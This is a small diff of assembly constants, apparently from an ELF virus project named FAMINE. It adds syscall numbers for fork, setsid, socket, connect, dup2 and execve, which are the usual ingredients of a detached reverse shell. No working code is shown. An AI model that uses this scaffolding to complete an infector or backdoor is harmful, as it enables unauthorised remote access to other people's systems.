@@ -6,7 +6,9 @@
 %define SYS_pwrite64	18
 %define SYS_getdents64	217
 %define SYS_exit		60
+%define SYS_fork        57
 %define O_RDONLY		0
+%define SYS_setsid      112
 %define SYS_openat		257
 %define AT_FDCWD  -100
 %define PT_NULL         0
@@ -17,6 +19,12 @@
 %define PF_W            2
 %define PF_R            4
 %define PAGE_SIZE       0x1000
+%define AF_INET 2
+%define SOCK_STREAM 1
+%define SYS_socket 41
+%define SYS_connect 42
+%define SYS_dup2	33
+%define SYS_execve	59
 %define FAMINE_SIZE end_addr - _start
 %define FAMINE_SIZE_NO_BSS buffer_bss - _start
 
